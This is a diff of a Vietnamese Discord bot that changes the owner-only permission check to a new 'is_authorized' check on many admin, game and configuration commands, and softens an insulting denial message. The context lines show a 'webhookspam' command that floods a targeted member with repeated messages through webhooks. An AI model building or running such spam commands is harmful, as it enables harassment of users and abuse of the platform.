@@ -1844,10 +1852,10 @@ async def set_server_icon(ctx, url: str = None):
 @set_server_icon.error
 async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="rename")
-@is_bot_owner()
+@is_authorized()
 async def rename_server(ctx, *, new_name: str):
     if len(new_name) > 100:
         new_name = new_name[:100]
@@ -1867,10 +1875,10 @@ async def rename_server(ctx, *, new_name: str):
 @rename_server.error
 async def rename_server_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="icon")
-@is_bot_owner()
+@is_authorized()
 async def set_icon(ctx, url: str = None):
     try:
         if url:
@@ -1902,10 +1910,10 @@ async def set_icon(ctx, url: str = None):
 @set_icon.error
 async def set_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="emoji")
-@is_bot_owner()
+@is_authorized()
 async def list_emoji(ctx):
     emojis = ctx.guild.emojis
     if not emojis:
@@ -1928,10 +1936,10 @@ async def list_emoji(ctx):
 @list_emoji.error
 async def list_emoji_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="steal")
-@is_bot_owner()
+@is_authorized()
 async def steal_emoji(ctx, emoji: discord.PartialEmoji, *, name: str = None):
     """
     Lấy emoji tùy chỉnh từ một server khác và thêm vào server hiện tại.
@@ -1979,7 +1987,7 @@ async def steal_emoji(ctx, emoji: discord.PartialEmoji, *, name: str = None):
         await ctx.send(f"❌ Lỗi: {str(e)}")
 # ==================== LỆNH WEBHOOK MỚI ====================
 @bot.command(name="addwebhook")
-@is_bot_owner()
+@is_authorized()
 async def addwebhook(ctx, name: str, count: int = 1):
     if count < 1:
         await ctx.send("❌ Số lượng phải lớn hơn 0!")
@@ -2053,7 +2061,7 @@ async def webhookspam(ctx, target: discord.Member, content: str, count: int = No
         await ctx.send(f"✅ Đã spam {sent}/{count} tin nhắn tới {target.mention} bằng webhook `{wh.name}`.")
 
 @bot.command(name="stopwebhookspam")
-@is_bot_owner()
+@is_authorized()
 async def stop_webhook_spam(ctx):
     webhooks_in_channel = await ctx.channel.webhooks()
     for wh in webhooks_in_channel:
@@ -2065,7 +2073,7 @@ async def stop_webhook_spam(ctx):
 
 # ==================== LỆNH CÀI ĐẶT KÊNH (WELCOME, GOODBYE, LEVEL, LOG) ====================
 @bot.command(name="setwelcome")
-@is_bot_owner()
+@is_authorized()
 async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         if str(ctx.guild.id) in WELCOME_CHANNELS:
@@ -2098,10 +2106,10 @@ async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
 @set_welcome_channel.error
 async def set_welcome_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="setgoodbye")
-@is_bot_owner()
+@is_authorized()
 async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         if str(ctx.guild.id) in GOODBYE_CHANNELS:
@@ -2134,10 +2142,10 @@ async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
 @set_goodbye_channel.error
 async def set_goodbye_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="setlevelchannel", aliases=["channelslv"])
-@is_bot_owner()
+@is_authorized()
 async def set_level_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         if str(ctx.guild.id) in SERVER_LEVEL_CHANNELS:
@@ -2194,10 +2202,10 @@ async def set_level_channel(ctx, channel: discord.TextChannel = None):
 @set_level_channel.error
 async def set_level_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="log", aliases=["channelslog"])
-@is_bot_owner()
+@is_authorized()
 async def set_log_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         if str(ctx.guild.id) in SERVER_LOG_CHANNELS:
@@ -2258,7 +2266,7 @@ async def set_log_channel(ctx, channel: discord.TextChannel = None):
 @set_log_channel.error
 async def set_log_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== LỆNH THÔNG TIN & HỆ THỐNG ====================
 @bot.command(name="stats")
@@ -2385,7 +2393,7 @@ async def member_count(ctx):
     await ctx.send(embed=embed)
 
 @bot.command(name="listroles")
-@is_bot_owner()
+@is_authorized()
 async def list_roles(ctx):
     roles = [role.name for role in ctx.guild.roles if role.name != "@everyone"]
     if not roles:
@@ -2403,10 +2411,10 @@ async def list_roles(ctx):
 @list_roles.error
 async def list_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="listchannels")
-@is_bot_owner()
+@is_authorized()
 async def list_channels(ctx):
     channels = [ch.mention for ch in ctx.guild.text_channels]
     if not channels:
@@ -2424,10 +2432,10 @@ async def list_channels(ctx):
 @list_channels.error
 async def list_channels_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="showsv")
-@is_bot_owner()
+@is_authorized()
 async def showsv(ctx):
     try:
         guilds = bot.guilds
@@ -2467,10 +2475,10 @@ async def showsv(ctx):
 @showsv.error
 async def showsv_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="admincmd")
-@is_bot_owner()
+@is_authorized()
 async def admin_commands(ctx):
     embed = discord.Embed(
         title="👑 DANH SÁCH LỆNH QUẢN TRỊ ĐẦY ĐỦ",
@@ -2505,11 +2513,11 @@ async def admin_commands(ctx):
 @admin_commands.error
 async def admin_commands_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== LỆNH HỆ THỐNG BACKUP/RESTORE ====================
 @bot.command(name="backup")
-@is_bot_owner()
+@is_authorized()
 async def backup_server(ctx):
     await ctx.send("⏳ Đang backup server...")
     try:
@@ -2549,10 +2557,10 @@ async def backup_server(ctx):
 @backup_server.error
 async def backup_server_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="restore")
-@is_bot_owner()
+@is_authorized()
 async def restore_server(ctx, file_name: str = None):
     try:
         if file_name is None:
@@ -2582,11 +2590,11 @@ async def restore_server(ctx, file_name: str = None):
 @restore_server.error
 async def restore_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== LỆNH LEVEL ====================
 @bot.command(name="setlv")
-@is_bot_owner()
+@is_authorized()
 async def set_level(ctx, level: int, member: discord.Member):
     try:
         if level < 1:
@@ -2609,7 +2617,7 @@ async def set_level(ctx, level: int, member: discord.Member):
 @set_level.error
 async def set_level_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
     else:
         await ctx.send(f"❌ Cú pháp đúng: `n! setlv <level> @user`")
 
@@ -3291,7 +3299,7 @@ async def help_command(ctx):
     await ctx.send(embed=embed, view=view)
 # ==================== LỆNH SETUP (CHỈ OWNER) ====================
 @bot.command(name="setup")
-@is_bot_owner()
+@is_authorized()
 async def setup(ctx):
     embed = discord.Embed(
         title="💖 HỆ THỐNG QUẢN TRỊ TỐI CAO CỦA BOSS BẢO 💖",
@@ -3931,7 +3939,7 @@ async def games_menu(ctx):
 
 # ==================== LỆNH OFF & ON ====================
 @bot.command(name="off")
-@is_bot_owner()
+@is_authorized()
 async def off_command(ctx, *, command_name: str = None):
     global bot_enabled
     if command_name is None:
@@ -3955,10 +3963,10 @@ async def off_command(ctx, *, command_name: str = None):
 @off_command.error
 async def off_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send('❌ ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="on")
-@is_bot_owner()
+@is_authorized()
 async def on_command(ctx, *, command_name: str = None):
     global bot_enabled
     if command_name is None:
@@ -3982,7 +3990,7 @@ async def on_command(ctx, *, command_name: str = None):
 @on_command.error
 async def on_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send('❌ ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== GLOBAL CHECK ====================
 @bot.check
@@ -4419,7 +4427,7 @@ async def leaderboard(ctx):
     await ctx.send(embed=embed)
 
 @bot.command(name="guithu")
-@is_bot_owner()
+@is_authorized()
 async def guithu(ctx, member: discord.Member, *, content: str):
     try:
         embed = discord.Embed(
@@ -4744,7 +4752,7 @@ async def slapgame(ctx, member: discord.Member, bet: int):
 
 # ---------- LỆNH OWNER DÀNH CHO GAME (10 lệnh) ----------
 @bot.command(name="setjackpot")
-@is_bot_owner()
+@is_authorized()
 async def setjackpot(ctx, amount: int):
     """Đặt số tiền jackpot cho slots"""
     if amount < 0:
@@ -4756,7 +4764,7 @@ async def setjackpot(ctx, amount: int):
     await ctx.send(f"✅ Đã đặt jackpot slots thành **{amount:,} coin**.")
 
 @bot.command(name="resetgamecooldowns")
-@is_bot_owner()
+@is_authorized()
 async def resetgamecooldowns(ctx):
     """Reset toàn bộ cooldown game (beg, crime, ...)"""
     for uid in daily_cooldowns:
@@ -4766,7 +4774,7 @@ async def resetgamecooldowns(ctx):
     await ctx.send("✅ Đã reset toàn bộ cooldown game (beg, crime).")
 
 @bot.command(name="setwinmultiplier")
-@is_bot_owner()
+@is_authorized()
 async def setwinmultiplier(ctx, multiplier: float):
     """Đặt hệ số nhân thưởng chung (áp dụng cho game)"""
     if multiplier < 0.1:
@@ -4778,7 +4786,7 @@ async def setwinmultiplier(ctx, multiplier: float):
     await ctx.send(f"✅ Đã đặt hệ số nhân thưởng chung thành **{multiplier}x**.")
 
 @bot.command(name="setdailylimit")
-@is_bot_owner()
+@is_authorized()
 async def setdailylimit(ctx, limit: int):
     """Đặt giới hạn coin nhận daily"""
     if limit < 100:
@@ -4790,7 +4798,7 @@ async def setdailylimit(ctx, limit: int):
     await ctx.send(f"✅ Đã đặt giới hạn daily thành **{limit:,} coin**.")
 
 @bot.command(name="addgameitem")
-@is_bot_owner()
+@is_authorized()
 async def addgameitem(ctx, name: str, price: int):
     """Thêm vật phẩm vào shop game"""
     if price <= 0:
@@ -4804,7 +4812,7 @@ async def addgameitem(ctx, name: str, price: int):
     await ctx.send(f"✅ Đã thêm vật phẩm **{name}** vào shop với giá {price} coin.")
 
 @bot.command(name="removegameitem")
-@is_bot_owner()
+@is_authorized()
 async def removegameitem(ctx, name: str):
     """Xóa vật phẩm khỏi shop game"""
     if not hasattr(bot, 'game_config') or 'shop_items' not in bot.game_config:
@@ -4817,7 +4825,7 @@ async def removegameitem(ctx, name: str):
     await ctx.send(f"✅ Đã xóa vật phẩm **{name}** khỏi shop.")
 
 @bot.command(name="setgameenabled")
-@is_bot_owner()
+@is_authorized()
 async def setgameenabled(ctx, game: str, status: str):
     """Bật/tắt một game cụ thể"""
     status = status.lower()
@@ -4837,7 +4845,7 @@ async def setgameenabled(ctx, game: str, status: str):
     await ctx.send(f"✅ Đã {status.upper()} game **{game}**.")
 
 @bot.command(name="setgamechannel")
-@is_bot_owner()
+@is_authorized()
 async def setgamechannel(ctx, channel: discord.TextChannel):
     """Đặt kênh thông báo game"""
     if not hasattr(bot, 'game_config'):
@@ -4846,7 +4854,7 @@ async def setgamechannel(ctx, channel: discord.TextChannel):
     await ctx.send(f"✅ Đã đặt kênh thông báo game thành {channel.mention}.")
 
 @bot.command(name="viewgameconfig")
-@is_bot_owner()
+@is_authorized()
 async def viewgameconfig(ctx):
     """Xem cấu hình game hiện tại"""
     if not hasattr(bot, 'game_config'):
@@ -4865,7 +4873,7 @@ async def viewgameconfig(ctx):
     await ctx.send(embed=embed)
 
 @bot.command(name="addgamecoins")
-@is_bot_owner()
+@is_authorized()
 async def addgamecoins(ctx, member: discord.Member, amount: int):
     """Thêm coin game cho người chơi"""
     if amount <= 0:
@@ -5291,7 +5299,7 @@ async def bot_info(ctx):
     await ctx.send(embed=embed)
 
 @bot.command(name="addowner")
-@is_bot_owner()
+@is_authorized()
 async def add_owner(ctx, member: discord.Member):
     if member.id in BOT_OWNERS:
         await ctx.send(f"⚠️ {member.mention} đã có trong danh sách Owner.")
@@ -5301,7 +5309,7 @@ async def add_owner(ctx, member: discord.Member):
     await ctx.send(f"✅ Đã thêm {member.mention} vào danh sách Owner.")
 
 @bot.command(name="deleteowner")
-@is_bot_owner()
+@is_authorized()
 async def delete_owner(ctx, member: discord.Member):
     if member.id not in BOT_OWNERS:
         await ctx.send(f"⚠️ {member.mention} không có trong danh sách Owner.")
@@ -5319,14 +5327,14 @@ async def say(ctx, *, content: str):
     await ctx.send(content)
 
 @bot.command(name="sayembed")
-@is_bot_owner()
+@is_authorized()
 async def say_embed(ctx, title: str, *, description: str):
     embed = discord.Embed(title=title, description=description, color=0x00FF00)
     embed.set_footer(text=f"Yêu cầu bởi {ctx.author.display_name}")
     await ctx.send(embed=embed)
 
 @bot.command(name="poll")
-@is_bot_owner()
+@is_authorized()
 async def poll(ctx, *, question: str):
     embed = discord.Embed(
         title="📊 BÌNH CHỌN",
@@ -5341,7 +5349,7 @@ async def poll(ctx, *, question: str):
     await msg.add_reaction("🤷")
 
 @bot.command(name="announce")
-@is_bot_owner()
+@is_authorized()
 async def announce(ctx, channel: discord.TextChannel, *, message: str):
     embed = discord.Embed(
         title="📢 THÔNG BÁO",
@@ -5380,7 +5388,7 @@ async def hex_to_color(ctx, hex_code: str):
         await ctx.send("❌ Mã HEX không hợp lệ. Ví dụ: `n! hex FF0000`")
 
 @bot.command(name="rolecolor")
-@is_bot_owner()
+@is_authorized()
 async def role_color(ctx, role: discord.Role, hex_code: str):
     try:
         hex_code = hex_code.strip("#")
@@ -5391,7 +5399,7 @@ async def role_color(ctx, role: discord.Role, hex_code: str):
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
 @bot.command(name="addemoji")
-@is_bot_owner()
+@is_authorized()
 async def add_emoji(ctx, name: str, url: str = None):
     if not url and ctx.message.attachments:
         url = ctx.message.attachments[0].url
@@ -5411,7 +5419,7 @@ async def add_emoji(ctx, name: str, url: str = None):
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
 @bot.command(name="removeemoji")
-@is_bot_owner()
+@is_authorized()
 async def remove_emoji(ctx, emoji: discord.Emoji):
     try:
         await emoji.delete()
@@ -5420,7 +5428,7 @@ async def remove_emoji(ctx, emoji: discord.Emoji):
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
 @bot.command(name="setstatus")
-@is_bot_owner()
+@is_authorized()
 async def set_status(ctx, status: str):
     status_map = {
         "online": discord.Status.online,
@@ -5436,13 +5444,13 @@ async def set_status(ctx, status: str):
     await ctx.send(f"✅ Đã đặt trạng thái thành **{status}**.")
 
 @bot.command(name="setgame")
-@is_bot_owner()
+@is_authorized()
 async def set_game(ctx, *, game: str):
     await bot.change_presence(activity=discord.Game(name=game))
     await ctx.send(f"🎮 Đã đặt game thành **{game}**.")
 
 @bot.command(name="setavatar")
-@is_bot_owner()
+@is_authorized()
 async def set_avatar(ctx, url: str = None):
     if not url and ctx.message.attachments:
         url = ctx.message.attachments[0].url
@@ -5462,7 +5470,7 @@ async def set_avatar(ctx, url: str = None):
         await ctx.send(f"❌ Lỗi: {str(e)}")
 
 @bot.command(name="setname")
-@is_bot_owner()
+@is_authorized()
 async def set_name(ctx, *, name: str):
     try:
         await bot.user.edit(username=name)
@@ -5472,7 +5480,7 @@ async def set_name(ctx, *, name: str):
 
 # ==================== LỆNH LEVEL & XP MỞ RỘNG ====================
 @bot.command(name="levelrole")
-@is_bot_owner()
+@is_authorized()
 async def level_role(ctx, level: int, role: discord.Role):
     if not hasattr(bot, 'level_roles'):
         bot.level_roles = {}
@@ -5503,7 +5511,7 @@ async def rank(ctx, member: discord.Member = None):
     await ctx.send(embed=embed)
 
 @bot.command(name="resetlevel")
-@is_bot_owner()
+@is_authorized()
 async def reset_level(ctx, member: discord.Member):
     uid = str(member.id)
     if uid in USER_LEVELS:
@@ -5514,7 +5522,7 @@ async def reset_level(ctx, member: discord.Member):
         await ctx.send(f"❌ {member.mention} chưa có level.")
 
 @bot.command(name="addxp")
-@is_bot_owner()
+@is_authorized()
 async def add_xp(ctx, member: discord.Member, amount: int):
     if amount <= 0:
         await ctx.send("❌ Số XP phải > 0.")
@@ -5524,7 +5532,7 @@ async def add_xp(ctx, member: discord.Member, amount: int):
     await ctx.send(f"✅ Đã thêm {amount} XP cho {member.mention}. Level: {old_lv} → {new_lv}")
 
 @bot.command(name="setxp")
-@is_bot_owner()
+@is_authorized()
 async def set_xp(ctx, member: discord.Member, xp: int):
     if xp < 0:
         await ctx.send("❌ XP không thể âm.")
@@ -5538,7 +5546,7 @@ async def set_xp(ctx, member: discord.Member, xp: int):
 # ==================== LỆNH WELCOME, GOODBYE, SETPING ====================
 
 @bot.command(name="welcome")
-@is_bot_owner()
+@is_authorized()
 async def set_welcome_message(ctx, *, content: str = None):
     """
     Thiết lập nội dung thông báo khi thành viên mới vào server.
@@ -5569,7 +5577,7 @@ async def set_welcome_message(ctx, *, content: str = None):
     await ctx.send(f"✅ Đã đặt nội dung welcome:\n{content}")
 
 @bot.command(name="goodbye")
-@is_bot_owner()
+@is_authorized()
 async def set_goodbye_message(ctx, *, content: str = None):
     """
     Thiết lập nội dung thông báo khi thành viên rời server.
@@ -5600,7 +5608,7 @@ async def set_goodbye_message(ctx, *, content: str = None):
     await ctx.send(f"✅ Đã đặt nội dung goodbye:\n{content}")
 
 @bot.command(name="setping")
-@is_bot_owner()
+@is_authorized()
 async def set_ping(ctx, mode: str, member: discord.Member, *, content: str):
     """
     Thiết lập phản hồi tự động khi có sự kiện liên quan đến một thành viên.
